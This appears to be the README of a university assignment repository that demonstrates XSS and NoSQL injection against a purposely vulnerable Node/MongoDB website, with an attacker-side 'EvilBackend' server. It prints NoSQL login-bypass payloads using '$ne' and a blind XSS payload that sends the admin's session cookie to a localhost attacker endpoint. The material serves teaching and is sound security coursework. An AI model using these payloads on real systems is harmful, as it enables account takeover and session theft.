# ISEC3004-Assignment<br>
<br>
## Introduction<br>
This is a repository for ISEC3004 Assignment. The assignment focuses on demostrating XSS and NoSQL Injection attacks.<br>
<br>
<br>
index.html - Main page for the website<br>
<br>
Backend - Backend Server<br>
This backend acts as a server for the website. It is written in NodeJS and ExpressJS. It uses MongoDB as the database.<br>
<br>
To run the backend server, navigate to the directory and run the following commands:<br>
`npm install`<br>
`nodemon index.js`<br>
<br>
EvilBackend - Backend Server for Blind XSS<br>
This backend acts as the server used by the bad actor to hunt for sesstion cookies. It is written in NodeJS and ExpressJS.<br>
<br>
To run the backend server, navigate to the directory and run the following commands:<br>
`npm install`<br>
`nodemon index.js`<br>
<br>
<br>
NoSql - NoSQL Injection Attack<br>
1. A bad actor can use the following payload to login as a different user if the email is known.<br>
`"password": {"$ne": null}` <br>
2. If the email is unknown the following payload will log you in as the first user in the database (In most cases the admin) <br>
`"email": {"$ne": null}, "password": {"$ne": null}`<br>
<br>

XSS - XSS Attack<br>
When a user account is created with a XSS payload such as: <br>
`<img src="invalid-url" onerror="this.src='http://localhost:5001/hack?cookie='+document.cookie; this.removeAttribute('onerror');"></img>` as the name.<br>
<br>
The payload will be executed when the Administrator of the system loads the admin page. The payload will send the session cookie to the bad actor's server. The EvilBackend server will then display the session cookie on the page and send a Email to the bad actor as a notification.<br>